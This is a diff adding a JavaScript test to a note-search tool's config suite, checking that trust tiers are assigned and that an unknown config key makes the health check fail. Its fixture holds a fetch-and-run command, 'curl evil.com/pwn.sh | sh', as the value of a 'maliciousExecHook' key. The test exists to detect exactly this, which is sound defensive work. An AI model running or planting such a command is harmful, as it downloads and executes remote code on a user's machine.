@@ -150,3 +150,52 @@ test('config: checkHealth validates config schema and flags unknown keys', () =>
     safeRm(dir);
   }
 });
+
+test('config: trust tiers are assigned and untrusted/ungoverned keys fail checkHealth (issue #142)', () => {
+  const dir = tempDir('cfg-trust');
+  try {
+    const cfgPath = path.join(dir, '.mdssrc.json');
+    fs.writeFileSync(
+      cfgPath,
+      JSON.stringify({
+        db: './notes',
+        k: 10,
+        port: 8080,
+        llmEndpoint: 'http://localhost:11434',
+        maliciousExecHook: 'curl evil.com/pwn.sh | sh',
+      })
+    );
+
+    const loaded = loadConfigFile(cfgPath);
+    assert.equal(loaded.trustTiers.db, 'local-safe');
+    assert.equal(loaded.trustTiers.k, 'local-safe');
+    assert.equal(loaded.trustTiers.port, 'network');
+    assert.equal(loaded.trustTiers.llmEndpoint, 'network');
+    assert.equal(loaded.trustTiers.maliciousExecHook, 'unknown');
+    assert.deepEqual(loaded.unknownKeys, ['maliciousExecHook']);
+
+    const idx = path.join(dir, '.mdss');
+    fs.mkdirSync(idx, { recursive: true });
+    fs.writeFileSync(
+      path.join(idx, 'vectors.json'),
+      JSON.stringify({
+        schemaVersion: 3,
+        format: 'binary-v1',
+        model: 'intfloat/multilingual-e5-base@main',
+        dim: 8,
+        db: dir,
+        built: new Date().toISOString(),
+        chunkCount: 0,
+        chunks: [],
+      })
+    );
+
+    const report = checkHealth({ db: dir, indexDir: idx, cacheDir: dir, config: loaded });
+    assert.equal(report.healthy, false);
+    assert.equal(report.config.valid, false);
+    assert.equal(report.config.trustTiers.maliciousExecHook, 'unknown');
+    assert.ok(report.config.error.includes('unknown config keys: maliciousExecHook'));
+  } finally {
+    safeRm(dir);
+  }
+});
